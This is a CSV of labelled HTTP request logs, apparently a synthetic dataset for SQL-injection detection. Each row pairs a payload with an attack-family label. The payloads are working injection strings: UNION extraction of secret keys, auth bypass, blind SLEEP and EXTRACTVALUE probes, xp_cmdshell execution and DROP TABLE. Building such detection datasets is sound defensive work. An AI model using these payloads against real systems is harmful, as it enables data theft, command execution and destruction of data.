time,source_ip,host,method,uri,user_agent,request_body,referer,flow_uid,dup_index,session_id,session_seq,label,attack_family,obfuscated,synthetic_duplicate,forced_unique_nonce,TEMP_benign_augmentation,aug_category
2023-07-15T06:02:57Z,180.229.51.10,37.85.58.9:80,POST,/account/login,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15","username=2544' UNION SELECT role,permissions FROM products/**/&password=x",,a_CkBs7q1SCpnokxgM0a,0,46acfbbaebbb,1,1,union_based,False,False,False,,
2023-07-15T18:16:07Z,117.27.128.238,37.85.58.9:80,GET,/lookup?name=' OR 1=1--,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,,,a_C437fu3IfiklWchp92,0,48868df77119,1,1,tautology,True,False,False,,
2023-07-10T04:13:27Z,158.67.185.111,37.85.58.9:80,POST,/account/login,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",username=admin'/**/&password=x,https://www.google.com/,a_C0htCG4An3OGPFsOmk,0,7020e8dc40a9,1,1,auth_bypass,True,False,False,,
2023-08-15T10:03:55Z,218.48.11.6,37.85.58.9:80,POST,/login,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15","username=""/**/AND/**/SLEEP(9)--/**/-&password=x",https://duckduckgo.com/,a_C1kko53bwNygcU39Mg,0,31a095dca372,1,1,time_based_blind,True,False,False,,
2023-08-15T06:13:06Z,97.50.240.188,37.85.58.9:80,POST,/portal/login,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","username=""/**/AND/**/EXTRACTVALUE(9,CONCAT(0x7e,(SELECT/**/@@version)))/*x*/&password=x",https://www.google.com/,a_CUFKWiRfVMbI012Yh,0,c4463e9f2128,1,1,error_based,True,False,False,,
2023-08-15T06:12:40Z,97.50.240.188,37.85.58.9:80,GET,/lookup?ref=13' AND 13=13-- comment,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,,a_CfgEHyAfjgLUnTijb,0,c4463e9f2128,2,1,boolean_blind,False,False,False,,
2023-08-13T15:56:04Z,129.136.206.117,37.85.58.9:80,POST,/api/auth,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","username=' UNION SELECT name,secret_key FROM sessions/**/&password=x",-,a_CJleoj23XHHNjbX5ui,0,91095dbc12a5,1,1,union_based,False,False,False,,
2023-08-15T22:33:20Z,141.94.222.8,37.85.58.9:80,POST,/account/login,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","username=""; EXEC xp_cmdshell('dir')/*x*/&password=x",,a_Cei8xI2vkC5uJkaFgh,0,3d9c8496db09,1,1,stacked_query,False,False,False,,
2023-07-17T03:53:37Z,200.49.71.103,37.85.58.9:80,GET,/lookup?search=%27;%20ExEC%20xp_cmDshELl(%27Ls%20-La%27)/*x*/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,https://www.google.com/,a_Cv68IMmWXBTKhtAqg,0,ccdd86bc3838,1,1,stacked_query,True,False,False,,
2023-07-10T04:12:42Z,158.67.185.111,37.85.58.9:80,POST,/api/auth,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",username=3075; DROP TABLE payments/*x*/&password=x,-,a_CO3ZK74QLGruj23q1c,0,7020e8dc40a9,2,1,stacked_query,False,False,False,,
